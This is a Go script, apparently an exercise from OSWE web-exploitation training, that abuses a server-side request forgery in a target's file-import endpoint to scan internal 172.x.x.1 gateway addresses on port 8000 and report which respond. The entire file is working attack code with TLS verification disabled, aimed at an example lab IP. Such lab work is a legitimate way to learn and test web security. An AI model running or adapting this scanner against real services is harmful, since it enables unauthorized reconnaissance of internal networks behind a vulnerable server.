package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 12.4.5.2 - SSRF gateway scanner

const port = 8000

func main() {
	target := flag.String("target", "", "target host/ip")
	timeout := flag.Int("timeout", 3, "timeout")

	// parse args
	flag.Parse()
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s --target=<URL> [--timeout=<actionlist>]", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s --target=http://192.168.249.135:8000/files.import", os.Args[0]))
		os.Exit(1)
	}

	var tr *http.Transport
	tr = &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		DisableCompression: true, // to ensure that we can obtain Content-Length response header
	}

	// create our HTTP client using the above transport and set the global variable
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(*timeout) * time.Second,
	}

	baseURL := "http://172.%d.%d.1"

	for i := 16; i < 256; i++ {
		for j := 1; j < 256; j++ {
			host := fmt.Sprintf(baseURL, i, j)
			utils.PrintInfo("Trying host: " + host)
			jsonBody := []byte(fmt.Sprintf("{\"url\":\"%s:%d\"}", host, port))

			req, err := http.NewRequest(http.MethodPost, *target, bytes.NewBuffer(jsonBody))
			if err != nil {
				log.Fatalln("[-] Failed to create HTTP request: ", err)
			}
			req.Header.Add("Content-Type", "application/json")

			resp, err := client.Do(req)
			if err != nil {
				var urlErr *url.Error
				if errors.As(err, &urlErr) && urlErr.Timeout() {
					fmt.Printf("%d \t timed out\n", port)
					continue
				} else {
					log.Fatalln("[-] Failed to send HTTP request: ", err)
				}
			}

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln("[-] Failed to read HTTP response body: ", err)
			}
			bodyString := string(body)

			if strings.Contains(bodyString, "You don't have permission to access this.") {
				fmt.Printf("%d \t OPEN - returned permission error, therefore valid resource\n", port)
			} else if strings.Contains(bodyString, "ECONNREFUSED") {
				fmt.Printf("%d \t CLOSED\n", port)
			} else if strings.Contains(bodyString, "Request failed with status code 404") {
				fmt.Printf("%d \t OPENED - returned 404\n", port)
			} else if strings.Contains(bodyString, "Parse Error:") {
				fmt.Printf("%d \t ???? - returned parse error, potentially open non-http", port)
			} else if strings.Contains(bodyString, "socket hang up") {
				fmt.Printf("%d \t OPEN - socket hang up, likely non-http", port)
			} else {
				fmt.Printf("%d \t %s", port, bodyString)
			}

			resp.Body.Close()
		}
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
